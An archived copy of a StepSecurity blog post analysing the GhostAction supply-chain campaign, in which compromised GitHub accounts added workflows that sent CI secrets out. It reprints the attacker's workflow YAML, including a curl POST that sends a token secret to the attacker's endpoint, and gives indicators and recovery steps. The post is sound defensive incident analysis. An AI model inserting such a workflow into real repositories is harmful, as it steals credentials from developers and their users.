---
url: "https://www.stepsecurity.io/blog/ghostaction-campaign-over-3-000-secrets-stolen-through-malicious-github-workflows"
title: "GhostAction Campaign: Over 3,000 Secrets Stolen Through Malicious GitHub Workflows - StepSecurity"
captured: "2026-11-02T19:00:43Z"
via: "live"
sha256: "b31035f7c481e0551aaef94a8e1c8e3ad566c2f480fb0f5324d0aef9af6ca8a5"
wayback: "https://web.archive.org/web/20261021185912/https://www.stepsecurity.io/blog/ghostaction-campaign-over-3-000-secrets-stolen-through-malicious-github-workflows"
cited_in:
  - "docs/threats/02-supply-chain-packages.md"
---

# GhostAction Campaign: Over 3,000 Secrets Stolen Through Malicious GitHub Workflows - StepSecurity

> Archived copy of a third-party page, kept so Bigman's findings survive if the original goes away. Copyright stays with the original publisher; cite the original URL.
>
> Original: <https://www.stepsecurity.io/blog/ghostaction-campaign-over-3-000-secrets-stolen-through-malicious-github-workflows>
> Snapshot: <https://web.archive.org/web/20261021185912/https://www.stepsecurity.io/blog/ghostaction-campaign-over-3-000-secrets-stolen-through-malicious-github-workflows>

[Back to Blog](https://www.stepsecurity.io/blog)

[Threat Intel](https://www.stepsecurity.io/blog?category=Threat Intel)

# GhostAction Campaign: Over 3,000 Secrets Stolen Through Malicious GitHub Workflows

GitGuardian researchers discover massive supply chain attack affecting 817 repositories across 327 GitHub users. Malicious workflows exfiltrated 3,325 secrets including PyPI, npm, and DockerHub tokens through compromised developer accounts.

Ashish Kurmi

[View LinkedIn](https://www.linkedin.com/in/ashish-kurmi-3428aa24)

September 5, 2025

[Share on X](https://www.stepsecurity.io/blog/ghostaction-campaign-over-3-000-secrets-stolen-through-malicious-github-workflows#)[Share on X](https://www.stepsecurity.io/blog/ghostaction-campaign-over-3-000-secrets-stolen-through-malicious-github-workflows#)[Share on LinkedIn](https://www.stepsecurity.io/blog/ghostaction-campaign-over-3-000-secrets-stolen-through-malicious-github-workflows#)[Share on Facebook](https://www.stepsecurity.io/blog/ghostaction-campaign-over-3-000-secrets-stolen-through-malicious-github-workflows#)[Follow our RSS feed](https://www.stepsecurity.io/blog/rss.xml)

Table of Contents

[Loading nav...](https://www.stepsecurity.io/blog/ghostaction-campaign-over-3-000-secrets-stolen-through-malicious-github-workflows#)

-

- https://www.stepsecurity.io/blog/ghostaction-campaign-over-3-000-secrets-stolen-through-malicious-github-workflows#

## Executive Summary

On September 5, 2025, security researchers Gaetan Ferry and Guillaume Valadon from GitGuardian uncovered "[GhostAction](https://blog.gitguardian.com/ghostaction-campaign-3-325-secrets-stolen/?ref=stepsecurity.io)," a sophisticated supply chain attack campaign that compromised 327 GitHub users across 817 repositories. The attackers injected malicious workflows that successfully exfiltrated 3,325 secrets including PyPI, npm, and DockerHub tokens to an attacker-controlled endpoint. This represents one of the largest coordinated GitHub Actions supply chain attacks to date, with compromised credentials spanning multiple package ecosystems and creating ongoing risks for the software supply chain.

## Technical Analysis

### Attack Vector

The GhostAction campaign employed a deceptively simple yet highly effective attack pattern. Compromised GitHub accounts pushed malicious workflow files disguised as security improvements. Each workflow, titled "Add Github Actions Security workflow," contained secret exfiltration code that executed on every push or manual trigger.

### The Malicious Workflow

The attackers crafted a consistent workflow template that they deployed across all compromised repositories:

```
name: Github Actions Security

on:
  workflow_dispatch:
  push:

jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'CODECOV_TOKEN=${{ secrets.CODECOV_TOKEN }}' https://bold-dhawan.45-139-104-115.plesk.page
```

The workflow's simplicity was its strength - it required no dependencies, used standard GitHub Actions syntax, and could bypass casual security reviews by appearing as a legitimate security workflow.

### Attack Methodology

The campaign followed a systematic approach:

#### Secret Enumeration

Attackers first analyzed legitimate workflow files in target repositories to identify secret names‍

#### Workflow Customization

Each malicious workflow was tailored with the specific secret names found in that repository

#### Immediate Execution

‍Workflows triggered on push, ensuring immediate secret exfiltration

This approach of compromising developer credentials to gain access to CI/CD secrets and ultimately obtain elevated access to production and publishing credentials remains a popular attack method. Based on our conversations with enterprises, we've learned that multiple red teams across various organizations have successfully used this exact technique to identify internal security gaps. The pattern is well-understood by security professionals: compromise a developer account, inject malicious workflows, harvest CI/CD secrets, and escalate to production access.

### Scale of Compromise

GitGuardian's analysis revealed the massive scope of this campaign:

- 327 compromised GitHub users
- 817 affected repositories
- 3,325 exfiltrated secrets
- 100+ repositories had already reverted changes by disclosure time

The compromised secrets included:

- DockerHub credentials (most common)
- GitHub personal access tokens
- npm authentication tokens
- PyPI API tokens
- AWS access keys
- Database credentials
- Cloudflare API tokens

Multiple companies had their entire SDK portfolio compromised across Python, Rust, JavaScript, and Go repositories, demonstrating how a single compromised developer account can cascade into organization-wide security incidents. You can use the following URL to view the list of publicly available malicious workflows.

https://github.com/search?q=bold-dhawan.45-139-104-115.plesk.page&type=code

### Infrastructure Analysis

The exfiltration endpoint bold-dhawan[.]45-139-104-115[.]plesk[.]page resolved to IP address 45.139.104.115, hosted at 493networking.cc. The domain naming pattern and hosting provider suggest a disposable infrastructure designed for this specific campaign. The endpoint ceased resolving on September 5 at 16:15 UTC, likely in response to public disclosure.

## Detection and Response

### How GitGuardian Discovered the Attack

The initial detection came through GitGuardian's internal security monitoring when the FastUUID project triggered alerts. The security research team, led by Gaetan Ferry and Guillaume Valadon, quickly identified the malicious workflow pattern and began investigating the broader campaign.

### Community Response

GitGuardian's disclosure process was exemplary:

- Created issues in 573 compromised repositories
- Directly notified package registry security teams
- Published detailed indicators of compromise

The rapid response helped contain the damage - no malicious package releases were detected despite the window of opportunity.

## Recovery Steps

If your repository was affected by the GhostAction campaign, take these immediate actions:

### Audit Your Repositories

Search for the malicious workflow file using the following GitHub search query (replace AcmeInc with your organization name):

https://github.com/search?q=bold-dhawan.45-139-104-115.plesk.page+org%3Aacmeinc&type=code

### Remove Malicious Workflows

If you discover the malicious workflow, delete it immediately from all repository branches.

### Rotate All Secrets Immediately

If you were impacted, rotate all GitHub Action secrets that were available to the repository workflows.

## Steps for StepSecurity Enterprise Customers

StepSecurity enterprise customers have additional tools and policies available to detect and prevent similar attacks:

### Enable Secret Exfiltration Workflow Run Policy

This policy is specifically designed to block secret access from unreviewed workflows and workflow changes, precisely the scenario exploited in the GhostAction campaign. When enabled, this policy would have prevented the malicious workflows from accessing repository secrets.

[Configure the Secret Exfiltration Policy](https://docs.stepsecurity.io/workflow-run-policies/policies#secret-exfiltration-policy)

If this policy was already enabled in your organization, review recent policy detection logs for any blocked attempts that might indicate targeting.

### Configure Runner Label Policy

Since the attackers created new workflows that could select GitHub-hosted runners, they could bypass Harden-Runner runtime monitoring even if it was previously configured. If your organization exclusively uses self-hosted runners, enable the Runner Label Policy to prevent unauthorized use of GitHub-hosted runners.

[Configure the Runner Label Policy](https://docs.stepsecurity.io/workflow-run-policies/policies#runner-label-policy)

### Review Harden-Runner Baselines

If any workflows executed with Harden-Runner protection during the compromise window, check your organization and cluster-level baselines for any observed calls to bold-dhawan[.]45-139-104-115[.]plesk[.]page. This domain should never appear in legitimate workflow network traffic.

### Enable Branch Protection

Implement branch protection rules to require pull request reviews before workflow changes can be merged. This adds a critical human review step that can catch malicious workflow additions.

[Configure Branch Protection](https://docs.github.com/en/repositories/configuring-branches-and-merges-in-your-repository/managing-protected-branches/about-protected-branches)

## Acknowledgments

We extend our gratitude to the GitGuardian security research team for their exceptional work in [discovering and responsibly disclosing this campaign](https://blog.gitguardian.com/ghostaction-campaign-3-325-secrets-stolen/).

We also thank the broader security community for their swift response in reverting malicious changes and securing affected repositories.

## Conclusion

The GhostAction campaign represents a significant evolution in GitHub Actions supply chain attacks. With over 3,000 secrets stolen across 817 repositories, it demonstrates both the scale of risk and the importance of proactive CI/CD security measures.

While the immediate threat has been contained thanks to the quick action by GitGuardian and the security community, the incident serves as a wake-up call. Organizations must treat their CI/CD pipelines as critical security perimeters and implement defense-in-depth strategies to protect against increasingly sophisticated attacks.
